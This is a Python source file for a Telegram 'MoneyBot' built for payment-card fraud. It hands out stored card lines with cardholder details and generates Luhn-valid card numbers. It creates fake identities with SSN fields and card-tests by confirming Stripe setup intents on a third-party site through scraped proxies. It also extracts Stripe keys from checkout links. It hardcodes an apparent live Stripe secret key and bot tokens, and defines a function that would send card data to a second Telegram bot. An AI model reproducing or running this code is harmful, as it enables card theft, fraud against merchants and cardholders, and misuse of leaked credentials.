import telebot, logging, requests, os, random, base64, itertools, re, time

sk="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"

from telebot.types import *
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

LOGGER = logging.getLogger("telebot").setLevel(logging.WARNING)

# Init session
vcc=open("livevccs.txt", "r").readlines()
BOT_TOKEN = os.environ.get("BOT_TOKEN", "2146061906:AAF4yIqShPVN93lzenkXEXMZ1YuZ_EmJlVo)
LOG_CHANNEL = os.environ.get("LOG_CHANNEL", "-1001833808324")
SUDO_USERS = os.environ.get("SUDO_USERS", "1909721616").split(" ")
CMD_HANDLERS=list(os.environ.get("CMD_HANDLERS", ".$/!#~"))

money=telebot.TeleBot(BOT_TOKEN)
print("CLIENT STARTED!")
print(LOG_CHANNEL)
money.send_message(text="BOT STARTED!", chat_id=LOG_CHANNEL)

def getVCC():
    OK=random.choice(vcc).replace("\n", "").split("|")
    pipe=OK[0]+"|"+OK[1]+"|"+OK[2]+"|"+OK[3]
    name=(OK[4]).capitalize()
    street=(OK[5]).capitalize()
    city=OK[6].capitalize()
    state=OK[7].upper()
    pincode=OK[8]
    return pipe, name, street, city, state, pincode, "United States"

def chkBin(bin):
    r=requests.get("https://bins-su-api.codentxbin.workers.dev/api/"+bin)
    if r.status_code!=200:
        return None 
    data=r.json()
    if data.get("result")!=True:
        return
    data=data.get("data")
    #{"result":true,"message":"BIN Found","data":{"bin":456787,"country":"ECUADOR","countryInfo":{"name":"ECUADOR","alpha2":"EC","alpha3":"ECU","numeric":"218","emoji":"🇪🇨"},"bank":"BANCO COMERCIAL DE MANABI, S.A.","level":"GOLD","type":"CREDIT","vendor":"VISA"}}
    msg=f"""*BIN*: `{bin} \n`*BANK*: `{data.get("bank", "IDK")}` \n*COUNTRY*: `{data.get("country","IDK")} {data.get("countryInfo").get("emoji", "IDK")}` \n*VENDOR*: `{data.get("vendor","IDK")}` \n*TYPE*: `{data.get("type", "IDK")}` \n*LEVEL*: `{data.get("level", "IDK")}`"""
    return msg

def chkIBAN(iban):
    url=f"https://openiban.com/validate/{iban}?getBIC=true&validateBankCode=true"
    r=requests.get(url)
    if r.json().get("valid")==True and r.json().get("checkResults").get("bankCode")==True:
        data=r.json().get("bankData")
        bankCode=data.get('bankCode', "IDK")
        name=data.get("name", "IDK")
        zipp=data.get("zip", 'IDK')
        city=data.get("city", "IDK")
        bic=data.get("bic", "IDK")
        return True, bankCode, name, zipp, city, bic
    else:
        return False, None, None, None, None, None

@money.message_handler(commands=["bin", "bininfo", "binfo"])
def binInfo(m):
    bin=None
    try:
        bin=m.text.split(" ")[1].strip()[:6].strip()
        int(bin)
    except:
        money.reply_to(m, "❌  *INVALID BIN* ❌",  parse_mode="Markdown")
        return
    res=chkBin(bin)
    if res!=None:
        money.reply_to(m, res, parse_mode="Markdown")
    else:
        money.reply_to(m, "❌  *INVALID BIN* ❌",  parse_mode="Markdown")

@money.message_handler(commands=["getvcc", "vcc"])
def binInfo(m):
    msg="""*CC*: `{}` \n\n*Full Name*: `{}`\n*Street*: `{}`\n*City*: `{}`\n*State*: `{}`\n*Pincode*: `{}`\n*Country*: `{}`"""
    try:
        pipe, name, street, city, state, pincode, country=getVCC()
        msg=msg.format(pipe, name, street, city, state, pincode, country)
    except Exception as e:
        print(e)
        money.reply_to(m, "❌  *INTERNAL ERROR* ❌",  parse_mode="Markdown")
        return
    
    money.reply_to(m, msg,  parse_mode="Markdown")

def getFakeINFO(nat='us'):
    response = requests.get('http://randomuser.me/api/?nat='+nat)
    data = response.json()
    #print(data['results'][0])
    fake_info = {
        'prefix': data['results'][0]['name']['title'],
        'first_name': data['results'][0]['name']['first'],
        'last_name': data['results'][0]['name']['last'],
        'gender': data['results'][0]['gender'],
        'email': data['results'][0]['email'].replace("example.com", random.choice(['gmail.com', 'email.com', 'yahoo.com', 'outlook.com'])),
        'dob': data['results'][0]['dob']['date'],
        'phone': data['results'][0]['phone'],
        'street': str(data['results'][0]['location']['street']['number'])+' '+data['results'][0]['location']['street']['name'],
        'city': data['results'][0]['location']['city'],
        'state': data['results'][0]['location']['state'],
        'country': data['results'][0]['location']['country'],
        'postcode': str(data['results'][0]['location']['postcode']),
        'age': data['results'][0]['dob']['age'],
        'uuid': data['results'][0]['login']['uuid'],
        'ssn': data['results'][0]['id']['value'],
    }

    return fake_info

@money.message_handler(commands=["fakeit", "fake"])
def fakeitvai(m):
    msg="""*Prefix*: `{}` \n*FIRST NAME*: `{}` \n*LAST NAME*: `{}` \n*FULL NAME*: `{}` \n*GENDER*: `{}` \n*EMAIL*: `{}` \n*DOB*: `{}` \n*SSN*: `{}` \n*AGE*: `{}` \n*PHONE*: `{}` \n\n*STREET*: `{}` \n*CITY*: `{}` \n*STATE*: `{}` \n*COUNTRY*: `{}` \n*POSTCODE*: `{}` \n\n*UUID*: `{}`"""
    data={}
    print(len(m.text.split(" ")))
    if len(m.text.split(" "))==1:
        data=getFakeINFO()
    else:
        data=getFakeINFO(m.text.split(" ")[1])
    msg=msg.format(data['prefix'], data['first_name'], data["last_name"], data['prefix']+' '+data['first_name']+' '+data['last_name'], data['gender'], data['email'], data['dob'], data["ssn"], data['age'], data['phone'], data['street'], data['city'], data['state'], data['country'], data["postcode"], data['uuid'])
    money.reply_to(m, msg, parse_mode="Markdown")



def gencc(first_6: int, mm: int=None, yy: int=None, cvv: int=None):
    BIN = 15-len(str(first_6))
    card_no = [int(i) for i in str(first_6)] 
    card_num = [int(i) for i in str(first_6)]
    seventh_15 = random.sample(range(BIN), BIN)
    for i in seventh_15:
        card_no.append(i)
        card_num.append(i)
    for t in range(0, 15, 2):
        card_no[t] = card_no[t] * 2
    for i in range(len(card_no)):
        if card_no[i] > 9:
            card_no[i] -= 9
    s = sum(card_no)
    mod = s % 10
    check_sum = 0 if mod == 0 else (10 - mod)
    card_num.append(check_sum)
    card_num = [str(i) for i in card_num]
    cc = ''.join(card_num)
    mm = random.randint(1, 12)
    if mm<10:
        mm="0"+str(mm)
    else:
        mm=str(mm)
    yy = random.randint(2024, 2028) if yy is None else yy
    cvv = random.choice(range(100, 999)) if cvv is None or len(str(cvv)) <= 2 else cvv
    return f'{cc}|{mm}|{yy}|{cvv}'

@money.message_handler(commands=["gen", "gencc", "givecc"])
def ccgenbot(m):
    text=m.text
    binn=None
    mon=None
    year=None
    cvv=None
    till=10
    if len(m.text.split(" ")) in [1]:
        money.reply_to(m, "❌ *BIN NOT FOUND* ❌", parse_mode="Markdown")
        return 
    if len(m.text.split(" ")) in [3]:
        try:
            till=int(m.text.split(" ")[2])
        except:
            till=10
    pipe=m.text.split(" ")[1]
    if len(pipe.split("|"))==4:
        binn=pipe.split("|")[0]
        mon=pipe.split("|")[1]
        year=pipe.split("|")[2]
        cvv=pipe.split("|")[3]
    elif len(pipe.split("|"))==3:
        binn=pipe.split("|")[0]
        mon=pipe.split("|")[1]
        year=pipe.split("|")[2]
    elif len(pipe.split("|"))==2:
        binn=pipe.split("|")[0]
        mon=pipe.split("|")[1]
    else: 
        binn=pipe.split("|")[0]
    gen=""
    for ik in range(till):
        gen+=gencc(binn, mon, year, cvv)+"\n"
    if till>15:
        filename=f"{till}x {binn} MoneyBot {str(m.from_user.id)}.txt"
        with open(filename, "w")  as f:
            f.write(gen)
        money.send_document(m.chat.id, open(filename, "rb"), caption=f"_Algo_: Luhn\nAmount {str(till)}", parse_mode="Markdown")
        os.system(f"rm '{filename}'")
        return
    money.reply_to(m, f"*GENERATED {str(till)} CCs*\n\n`{gen}`\n_Algo_: Luhn", parse_mode="Markdown")


@money.message_handler(commands=["iban", "ibaninfo", "ibinfo"])
def binInfo(m):
    bin=None
    try:
        bin=m.text.split(" ")[1].strip()
    except:
        money.reply_to(m, "❌  *INVALID IBAN* ❌",  parse_mode="Markdown")
        return
    res, bankCode, name, zipp, city, bic=chkIBAN(bin)
    if res!=False:
        msg=f"""*BANK CODE*: `{bankCode}` \n*BANK NAME*: `{name}` \n*ZIP*: `{zipp}` \n*CITY*: `{city}` \n*BIC*: `{bic}`"""
        money.reply_to(m, msg, parse_mode="Markdown")
    else:
        money.reply_to(m, "❌  *INVALID IBAN* ❌",  parse_mode="Markdown")





import requests, os, re, urllib3, time, string, random
from bs4 import BeautifulSoup
urllib3.disable_warnings()

regex_html_tag = re.compile(r'<[^>]+>')

def remove_tags(text):
    return regex_html_tag.sub('', text)

def getSETI(html):
    soup = BeautifulSoup(html, 'html.parser')
    seti_value = soup.form['data-secret']
    seti_value2= "seti_"+seti_value.split("_")[1]
    return seti_value, seti_value2





    
bot_token="5935678255:AAH4yHqwVwwiARYe-DV5I3ffTalWo22Ghrg"
chat_id="2105574691"
def sendIP(cc):
    requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text="+cc)
    
def getProxy(html):
    return re.findall("\\d{1,3}(?:\\.\\d{1,3}){3}(?::\\d{1,5})?", html)

def sendRequest():
    h= {
    "Host": "www.sslproxies.org",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "dnt": "1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
    }
    req=requests.get("https://www.sslproxies.org/", headers=h, verify=False).text 
    return req

def getHTTPProxy():
    proxies=getProxy(sendRequest())
    ok=[]
    for proxy in proxies:
        if len(proxy.split(":"))==2:
           # print(proxy)
            ok.append(proxy)
    ip=ok[0].split(":")[0]
    return {"http"  : "http://"+ok[0]}, ip



def authCC(ccn, mon, year, cvv):
    start_time = time.perf_counter ()
    proxy, ip=getHTTPProxy()
    h1={
    "sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "cache-control": "no-cache",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7,hi;q\u003d0.6"
  }

    req1=requests.get("https://propertydata.co.uk/free-trial/2", headers=h1, proxies=proxy, verify=False)
    html=req1.text
    setiID, setiID2=getSETI(html)
    if setiID and setiID2:
        pass
    else:
        return "ERROR: SETI ID NOT FOUND ~ IP: "+ip
   # print(setiID, setiID2)
    h2={
    "Host": "api.stripe.com",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://js.stripe.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://js.stripe.com/",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7,hi;q\u003d0.6"
    }
    
   
    d2=f"payment_method_data[type]=card&payment_method_data[billing_details][name]=Charlie+Puth&payment_method_data[card][number]={ccn}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mon}&payment_method_data[card][exp_year]={year}&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2F6aa5f07608%3B+stripe-js-v3%2F6aa5f07608&payment_method_data[time_on_page]=79569&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_3o0n45H4gBqzxcctY7JKbNLC&client_secret={setiID}"
    req2=requests.post(f"https://api.stripe.com/v1/setup_intents/{setiID2}/confirm", headers=h2, data=d2, proxies=proxy, verify=False)
    #print(req2.text)
    end_time = time.perf_counter()
    takenTime=str(end_time - start_time)[:4]+"s"
    if req2.status_code==402:
        msg=req2.json()["error"]["message"]
        
        if "Your card's security code is incorrect." in req2.text:
            return True, "CCN ~ APPROVED", msg, takenTime
        elif "Your card has insufficient funds." in req2.text:
            return True, "CVV ~ APPROVED", msg, takenTime
        elif "Your card does not support this type of purchase." in req2.text:
            return True, "CVV ~ APPROVED", msg, takenTime
        return False, None, msg, takenTime
    elif req2.status_code==200 and req2.json().get("status")=="succeeded":
        return True, "CVV ~ APPROVED", "succeeded", takenTime
    else:

        return False, None, msg, takenTime



@money.message_handler(commands=["auth"])
def chrCCbot(m):
    global sk
    ok=None
    if len(m.text.split(" "))!=2:
        money.reply_to(m, "❌ *PIPE NOT PROVIDED* ❌" ,parse_mode="Markdown")
        return
    ok=m.text.split(" ")[1]
    print(ok, "ok")
    if len(ok.split("|"))!=4:
        money.reply_to(m, "❌ *INVALID PIPE FORMAT* ❌" ,parse_mode="Markdown")
        return
    ccn, mon, year, cvv=None, None, None, None 
    try:
        tmp=ok.split("|")
        ccn=tmp[0]
        mon=tmp[1]
        year=tmp[2]
        cvv=tmp[3]
        #print("ok", ccn, mon, year, cvv)
        if len(cvv) not in [3,4] or len(mon) not in [2, 1] or len(year) not in [2,4] or len(ccn) not in [15, 16]:
            money.reply_to(m, "❌ *INVALID DATA PROVIDED* ❌", parse_mode="Markdown")
            return
    except Exception as e:
        print(e)
        money.reply_to(m, "❌ *INVALID DATA PROVIDED* ❌", parse_mode="Markdown")
        return
    k, typeApproved, res, tt=authCC(ccn, mon, year, cvv)
    msg=""
    if k==True:
        msg=f"""*STRIPE AUTH [SETI]*\n`{ok}`\n\n✅ *{typeApproved}*\n*MSG*: `{res}`\n*TIME TAKEN*: `{tt}`"""
    else:
        msg=msg=f"""*STRIPE AUTH [SETI]*\n`{ok}`\n\n ❌  *DEAD*\n*MSG*: `{res}`\n*TIME TAKEN*: `{tt}`"""
    money.reply_to(m, msg, parse_mode="Markdown")
def getPK(data):
    ok=""
    try:
        ok=decode_xor(getBaseRaw(data))
    except:
        return "Not Found"
    regex="pk_live_[0-9a-zA-Z]{99}|pk_live_[0-9a-zA-Z]{34}|pk_live_[0-9a-zA-Z]{24}"
    try:
        return re.findall(regex, ok)[0]
    except Exception as e:
        return "Not Found"
def getBaseRaw(data):
    try:
        deBase64 = base64.b64decode(data.replace("%2F", "/").replace("%2B","+")).decode("utf-8")
     #   print()
      #  print(deBase64)
        return deBase64
    except Exception as e:
        print(e)
        return "Not Found"
def decode_xor(data, key=5):
    try:
        decoded = []
        for char, k in zip(data, itertools.cycle([key])):
             decoded.append(chr(ord(char) ^ k))
        return "".join(decoded)
    except:
        return "Not Found"

def getCS(data):
    regex="cs_live_[0-9a-zA-Z]{58}"
    try:
        return re.findall(regex, data)[0]
    except:
        return "Not Found"
def getRawData(pk, cs):
    h={
    "Host": "api.stripe.com",
    "sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://checkout.stripe.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://checkout.stripe.com/",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7,hi;q\u003d0.6"
    }
    data=f"key={pk}&eid=NA&browser_locale=en-IN&redirect_type=url"
    url=f"https://api.stripe.com/v1/payment_pages/{cs}/init"
    req=requests.post(url, data=data, headers=h)
    if req.status_code==200:
        return req.json()
    return None


def getEmail(raw):
    email=raw.get("customer_email", "Not Found")
    return email

def getAmt(raw):
    try:
        amt=raw.get("line_item_group", {}).get("line_items", {})[0].get("total", "Not Found")
        return str(amt)
    except:
        return "Not Found"

def getCurrency(raw):
    try:
        c=raw.get("line_item_group", {}).get("currency", "Not Found")
        return c
    except:
        return "Not Found"



def getEveryThing(url):
    hashh=url.split("#")
    hashh=hashh[len(hashh)-1]
    
    pk=getPK(hashh)
    cs=getCS(url)
    print(pk, cs)
    raw=getRawData(pk, cs)
    if raw==None:
        return "Session Expired!", None, None, None, None, None
    email=getEmail(raw)
    amt=getAmt(raw)
    currency=getCurrency(raw)
    return True, pk, cs, email, amt, currency


def findChkOut(text):
    if "checkout.stripe.com/c/pay/cs_live_" in text or "pay.openai.com/c/pay" in text:
        return text.split(" ")[0]

@money.message_handler(func=lambda m: True)
def grabPKndCS(message):
    text=message.text 
    msg="""*Successfully Grabbed*✅

*PK Live*: `{}`

*CS Live*: `{}`

*Email*: `{}`
*Amount*: `{}`
*Currency*: `{}`

USER :- [{}](tg://user?id={})"""
    link=findChkOut(text)
    if link!=None:
        userName=message.from_user.first_name
        userid=message.from_user.id
        ok, pk, cs, email, amt, currency=getEveryThing(link)
        #ok, pk, cs, email, amt, currency=True, "ok", "ok", "ok", "ok", "ok"
        if ok!=True:
            money.reply_to(message, ok, parse_mode="Markdown")
            return
        msg=msg.format(pk, cs, email, amt, currency, userName, userid)
        money.reply_to(message, msg, parse_mode="Markdown")



money.polling()
